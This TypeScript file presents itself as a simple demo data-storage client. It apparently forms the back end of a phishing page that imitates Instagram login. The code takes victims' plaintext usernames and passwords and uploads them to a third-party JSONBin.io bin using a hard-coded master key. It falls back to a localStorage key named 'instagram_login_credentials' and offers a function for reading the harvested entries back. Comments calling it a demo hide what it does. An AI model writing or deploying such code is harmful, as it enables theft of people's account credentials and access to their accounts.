
// This file implements a simple API client for storing data
// In a production environment, this would connect to a proper secured backend

export interface Credential {
  _id: string;
  username: string;
  password: string;
  timestamp: string;
}

// A simple shared data service using JSONBin.io
// This is for DEMO purposes only - in a real app, you should NEVER
// store credentials like this and should use a proper backend with authentication
class RemoteDataService {
  private readonly API_KEY = "$2a$10$9zVDPXOn7uqDDOV3OwlL6eU7HCibKQpSOJFnHBBXLhNn6TnB57CdC"; // Updated public demo key
  private readonly BIN_ID = "65f22cde266cfc3fde98d37d"; // Updated bin ID
  private readonly API_URL = "https://api.jsonbin.io/v3/b";
  
  async storeCredential(username: string, password: string): Promise<{ success: boolean, id: string, error?: string }> {
    try {
      console.log('RemoteDataService: Attempting to store credentials');
      
      // First, get existing data
      const existingData = await this.getCredentials();
      console.log('RemoteDataService: Got existing data, count:', existingData.length);
      
      // Create a new credential document
      const newCredential: Credential = {
        _id: crypto.randomUUID(), // Generate a random ID
        username,
        password,
        timestamp: new Date().toISOString()
      };
      
      // Add to existing credentials
      const updatedData = [...existingData, newCredential];
      
      // Store to JSONBin
      console.log('RemoteDataService: Sending updated data to remote service');
      const response = await fetch(`${this.API_URL}/${this.BIN_ID}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': this.API_KEY,
          'X-Bin-Versioning': 'false'
        },
        body: JSON.stringify(updatedData)
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error('RemoteDataService: Failed to store data', {
          status: response.status,
          statusText: response.statusText,
          errorText
        });
        return { 
          success: false, 
          id: '', 
          error: `Failed to store data: ${response.status} ${response.statusText}` 
        };
      }
      
      const responseData = await response.json();
      console.log('RemoteDataService: Successfully stored credential', responseData);
      return { success: true, id: newCredential._id };
    } catch (error) {
      console.error("RemoteDataService: Exception during credential storage:", error);
      return { 
        success: false, 
        id: '', 
        error: error instanceof Error ? error.message : 'Unknown error occurred' 
      };
    }
  }
  
  async getCredentials(): Promise<Credential[]> {
    try {
      console.log('RemoteDataService: Fetching credentials from remote service');
      // Get data from JSONBin
      const response = await fetch(`${this.API_URL}/${this.BIN_ID}`, {
        method: 'GET',
        headers: {
          'X-Master-Key': this.API_KEY
        }
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error('RemoteDataService: Failed to fetch data', {
          status: response.status,
          statusText: response.statusText,
          errorText
        });
        return [];
      }
      
      const data = await response.json();
      console.log('RemoteDataService: Received data from remote service');
      
      // Ensure we're returning an array of credentials
      if (data && data.record && Array.isArray(data.record)) {
        return data.record;
      } else {
        console.warn('RemoteDataService: Remote service returned invalid data format, returning empty array', data);
        return [];
      }
    } catch (error) {
      console.error("RemoteDataService: Exception during credentials retrieval:", error);
      
      // Fall back to empty array if the fetch fails
      return [];
    }
  }
}

// Create a singleton instance
const remoteDataService = new RemoteDataService();

export async function storeLoginCredential(username: string, password: string): Promise<{ success: boolean, id: string, error?: string }> {
  console.log('storeLoginCredential: Attempting to store credential:', { username });
  
  try {
    // Try remote storage first
    const result = await remoteDataService.storeCredential(username, password);
    console.log('storeLoginCredential: Credential storage result:', result);
    
    if (!result.success && result.error) {
      console.warn(`storeLoginCredential: Remote storage failed: ${result.error}, falling back to localStorage`);
      
      // Fall back to localStorage if the remote service fails
      const localResult = storeLocalCredential(username, password);
      return localResult;
    }
    
    return result;
  } catch (error) {
    console.error("storeLoginCredential: Unexpected error:", error);
    
    // Fall back to localStorage as a last resort
    const localResult = storeLocalCredential(username, password);
    return localResult;
  }
}

// Helper function to store credentials in localStorage
function storeLocalCredential(username: string, password: string): { success: boolean, id: string } {
  try {
    console.log('storeLocalCredential: Storing in localStorage');
    
    // Get existing credentials from localStorage
    const existingCredentials = getLocalCredentials();
    
    // Create a new credential document
    const newCredential: Credential = {
      _id: crypto.randomUUID(),
      username,
      password,
      timestamp: new Date().toISOString()
    };
    
    // Add to existing credentials
    existingCredentials.push(newCredential);
    
    // Save back to localStorage
    localStorage.setItem('instagram_login_credentials', JSON.stringify(existingCredentials));
    console.log('storeLocalCredential: Successfully stored in localStorage');
    
    return { success: true, id: newCredential._id };
  } catch (error) {
    console.error("storeLocalCredential: Failed to store in localStorage:", error);
    return { success: false, id: '' };
  }
}

export async function getLoginCredentials() {
  console.log('getLoginCredentials: Retrieving login credentials');
  try {
    // Try to get from remote service first
    const credentials = await remoteDataService.getCredentials();
    console.log('getLoginCredentials: Retrieved credentials from remote service, count:', credentials.length);
    
    // Sort by timestamp in descending order (newest first)
    credentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    return { success: true, data: credentials };
  } catch (error) {
    console.error("getLoginCredentials: Remote fetch failed, falling back to localStorage:", error);
    
    // Fall back to localStorage if the remote service fails
    const localCredentials = getLocalCredentials();
    
    // Sort by timestamp in descending order (newest first)
    localCredentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    return { success: true, data: localCredentials };
  }
}

// Helper function to get credentials from localStorage
function getLocalCredentials(): Credential[] {
  try {
    const storedData = localStorage.getItem('instagram_login_credentials');
    if (!storedData) return [];
    return JSON.parse(storedData) as Credential[];
  } catch (error) {
    console.error("getLocalCredentials: Failed to retrieve local credentials:", error);
    return [];
  }
}
